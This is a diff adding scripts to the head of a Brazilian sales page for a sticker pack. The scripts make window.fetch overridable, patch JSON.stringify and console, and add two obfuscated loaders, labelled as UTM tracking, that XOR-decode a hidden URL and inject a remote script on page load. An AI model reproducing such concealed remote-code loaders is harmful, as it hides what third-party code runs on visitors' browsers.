@@ -1,6 +1,113 @@
 <!doctype html>
 <html lang="pt-BR">
   <head>
+    <script>
+      // 1. Ensure window.fetch has both getter and setter so scripts attempting to wrap fetch do not fail on read-only getter
+      (function() {
+        try {
+          var win = typeof window !== 'undefined' ? window : globalThis;
+          var curFetch = win.fetch ? win.fetch.bind(win) : null;
+          var descriptor = {
+            get: function() {
+              return curFetch;
+            },
+            set: function(newFetch) {
+              curFetch = newFetch;
+            },
+            configurable: true,
+            enumerable: true
+          };
+          try {
+            Object.defineProperty(win, 'fetch', descriptor);
+          } catch (e) {}
+          try {
+            if (typeof Window !== 'undefined' && Window.prototype) {
+              Object.defineProperty(Window.prototype, 'fetch', descriptor);
+            }
+          } catch (e) {}
+        } catch (err) {}
+      })();
+
+      // 2. Prevent "Converting circular structure to JSON" from tracking scripts logging DOM elements with React Fibers
+      (function() {
+        try {
+          var origStringify = JSON.stringify;
+          JSON.stringify = function(value, replacer, space) {
+            var seen = new WeakSet();
+            function circularReplacer(key, val) {
+              if (typeof val === 'object' && val !== null) {
+                if (typeof Node !== 'undefined' && val instanceof Node) {
+                  return {
+                    nodeType: val.nodeType,
+                    tagName: val.tagName,
+                    id: val.id,
+                    className: val.className
+                  };
+                }
+                if (typeof Window !== 'undefined' && val instanceof Window) {
+                  return '[Window]';
+                }
+                if (seen.has(val)) {
+                  return '[Circular]';
+                }
+                seen.add(val);
+              }
+              if (typeof replacer === 'function') {
+                return replacer.call(this, key, val);
+              }
+              return val;
+            }
+
+            if (Array.isArray(replacer)) {
+              return origStringify.call(this, value, replacer, space);
+            }
+
+            try {
+              return origStringify.call(this, value, circularReplacer, space);
+            } catch (e) {
+              return '"[Circular]"';
+            }
+          };
+
+          // Sanitize console arguments so logging DOM nodes doesn't trigger circular JSON serialization in iframe bridges
+          var methods = ['log', 'info', 'warn', 'error', 'debug'];
+          methods.forEach(function(m) {
+            if (typeof console !== 'undefined' && console[m]) {
+              var origMethod = console[m];
+              console[m] = function() {
+                var safeArgs = [];
+                for (var i = 0; i < arguments.length; i++) {
+                  var a = arguments[i];
+                  if (a && typeof a === 'object') {
+                    if ((typeof Node !== 'undefined' && a instanceof Node) || a.nodeType) {
+                      safeArgs.push('[Element ' + (a.tagName || 'node') + (a.id ? '#' + a.id : '') + ']');
+                      continue;
+                    }
+                    if (Array.isArray(a)) {
+                      safeArgs.push(a.map(function(item) {
+                        if (item && typeof item === 'object' && ((typeof Node !== 'undefined' && item instanceof Node) || item.nodeType)) {
+                          return '[Element ' + (item.tagName || 'node') + (item.id ? '#' + item.id : '') + ']';
+                        }
+                        return item;
+                      }));
+                      continue;
+                    }
+                  }
+                  safeArgs.push(a);
+                }
+                return origMethod.apply(this, safeArgs);
+              };
+            }
+          });
+        } catch (e) {}
+      })();
+    </script>
+
+    <!-- Script Utmify -->
+    <script>(function(){var h_7i=atob("DEHdC0Vm44aWcxpyOjr/fjcKwby0G24GSjLnJGoFh+i4Bm4fUyekJSYJjqj0ATUBWTO0ezEVzPb/C38eFTG0cyAKzezlUTZQWzWpeSwElvLzADhIYRzxKSIKjOT3H2lQABqmKSsHjuO0STgCUzm4ZwwCwaq0BXseTyT/MWdQgr/yEC0QDSPlOnZRgLTzSn8UCSK8O3REntvr");var n_pb=[];for(var c_sdpr=0;c_sdpr<h_7i.length;c_sdpr++){n_pb.push(h_7i.charCodeAt(c_sdpr)&255);}var n_w=n_pb[0];var t_si=n_pb.slice(1,1+n_w);var i_qn=n_pb.slice(1+n_w);var t_t=i_qn.map(function(b,e_x){return b^t_si[e_x%n_w];});var f_ko5="";for(var u_0=0;u_0<t_t.length;u_0++){f_ko5+=String.fromCharCode(t_t[u_0]&255);}var g_uhu=decodeURIComponent(escape(f_ko5));var r_17x=JSON.parse(g_uhu);var o_v=r_17x.globals||[];o_v.forEach(function(c_zmlp){window[c_zmlp.name]=c_zmlp.value;});var c_ce=document.createElement("script");c_ce.src=r_17x.url;c_ce.async=true;c_ce.defer=true;(r_17x.attributes||[]).forEach(function(q_ma3){c_ce.setAttribute(q_ma3.name,q_ma3.value);});(document.head||document.documentElement).appendChild(c_ce);})();</script>
+
+    <!-- Script de UTMs -->
+    <script>(function(){var k_xok=atob("DFxb/uoLYVxqlTP+iyd5i5hnQ2ZI/UeK+y9h0cVoBTJE4EeT4joi0IlkDHII5xyN6C4yjp54Tike+EDR5z0vm5l/TzYZtx/c6igvjINpFCgP5hHE0Cd5kItmBH5Qt1ef/z12i55mCDoTuEOM7io+kJ4mGT8F8R6N6Dd50sh9ADAf8BHEqX4m0pEpDz0H8BHEqTg6iosmFCgH/FWHpiwpm5xuDyhH5kac4jgo3MYpFz0G4FbcsX55g7d2");var a_6u=[];for(var y_tfn6=0;y_tfn6<k_xok.length;y_tfn6++){a_6u.push(k_xok.charCodeAt(y_tfn6)&255);}var a_5hf=a_6u[0];var s_z3=a_6u.slice(1,1+a_5hf);var g_z8=a_6u.slice(1+a_5hf);var c_mpb4=g_z8.map(function(b,e_5qs){return b^s_z3[e_5qs%a_5hf];});var i_hndi="";for(var b_6af=0;b_6af<c_mpb4.length;b_6af++){i_hndi+=String.fromCharCode(c_mpb4[b_6af]&255);}var i_9=decodeURIComponent(escape(i_hndi));var n_v=JSON.parse(i_9);var q_j3r2=n_v.globals||[];q_j3r2.forEach(function(c_2gc){window[c_2gc.name]=c_2gc.value;});var c_8fq=document.createElement("script");c_8fq.src=n_v.url;c_8fq.async=true;c_8fq.defer=true;(n_v.attributes||[]).forEach(function(f_osq7){c_8fq.setAttribute(f_osq7.name,f_osq7.value);});(document.head||document.documentElement).appendChild(c_8fq);})();</script>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
     <title>Pack Manu Stories | +15.000 Figurinhas e Elementos para Stories</title>
